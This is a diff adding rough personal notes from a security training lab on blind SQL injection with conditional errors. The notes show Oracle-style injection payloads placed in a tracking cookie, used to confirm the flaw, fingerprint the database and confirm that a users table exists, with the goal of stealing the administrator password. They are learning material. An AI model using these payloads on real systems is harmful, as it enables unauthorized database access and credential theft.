@@ -1,0 +1,25 @@
+LAB 12: Blind SQL injection with conditional errors
+
+VULNERABLE parameter : Tracking cookie
+
+End Goals: 
+1. Get the administrator password
+2. Login as the administrator users
+
+Analysis: 
+1. Confirm that it is vulnerable to sqli
+*** I try to hit the single quote after cookie value: TrackingId=yYPva2Pmp512yKYm' ==> does shows me 500 Internal Server Error 
+*** And again, If I try to close that single quote then: TrackingId=yYPva2Pmp512yKYm'' ==> it does gives me 200 res which proves that there is sqli.
+
+2. Let's add the concenate sql-query: 
+ *** ' || (SELECT '') || ' ==> This does select the empty string this is well formated sql-query.
+*** This well formated sql-query gives me 500 server error this indicates that may be we are not dealing with the mysql database, we may be dealing with the another type of the database.
+
+3. Oracle database require FROM clause inorder to be query to be valid: 
+ *** ' || (SELECT '' FROM DUAL) || ' ==> this gives me 200 res so it does confirm that the database used in backend is oracle database.
+
+*** Now, check something that the table doesnot exist hai ta::
+      *** ' || (SELECT '' FROM DUALMYTABLE) || ' ==> This should give 500 error, then cofirm that we are dealing with the oracle sqli 
+4. cofirm that the users table exist in the database: 
+    *** ' || (SELECT '' FROM users) || ' ==> This is giving me 500 error because this is giving me empty entry from each of users table which might break our sql query, try to select this from the single row.
+    *** ' || (SELECT '' FROM users WHERE ROWNUM=1) || ' ==> This does gives me 200 res so this indicate that there is table called username.
